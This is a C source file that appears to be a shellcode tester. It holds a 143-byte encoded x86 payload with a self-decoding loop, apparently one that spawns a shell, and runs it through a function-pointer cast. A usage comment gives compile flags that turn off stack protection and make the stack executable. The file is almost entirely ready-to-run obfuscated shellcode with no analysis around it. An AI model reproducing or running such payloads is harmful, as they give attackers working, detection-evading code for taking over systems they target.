#include <stdio.h>
#include <string.h>

/*143 bytes len
	usage:
		gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
		./shellcode
*/
unsigned char payload[] =\
"\xeb\x2f\x31\xc0\x31\xdb\x31\xd2\x31\xc9\x5a\x52\x89\xd6\x89\xd7\x46\x47\xb1\x59\x31\xc0\x31\xdb\x8a\x07\x01\xf8\x8a\x18\x88\x1e\x89\xc7\x47\x46\xe2\xee\x59\xff\xd1\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xcc\xff\xff\xff\x31\x01\xc0\x03\x7a\x6b\x50\x03\x76\x50\x68\x02\x4f\x62\x03\x6c\x49\x61\x01\x73\x01\x68\x02\x54\x68\x01\x62\x03\x5e\x7a\x69\x01\x6e\x01\x2f\x03\x54\x48\x68\x01\x2f\x03\x47\x4d\x2f\x01\x2f\x01\x2f\x01\x89\x03\x4a\x62\xe3\x01\x50\x02\x42\x89\x02\x63\xe2\x02\x62\x53\x03\x4f\x41\x89\x01\xe1\x03\x72\x5b\xb0\x03\x48\x66\x0b\x02\x61\xcd\x02\x4f\x80\x03\x41\x4e";

main()
{
	printf("Payload Length:  %d\n", strlen(payload));
	int (*ret)() = (int(*)())payload;
	ret();
	return 0;
}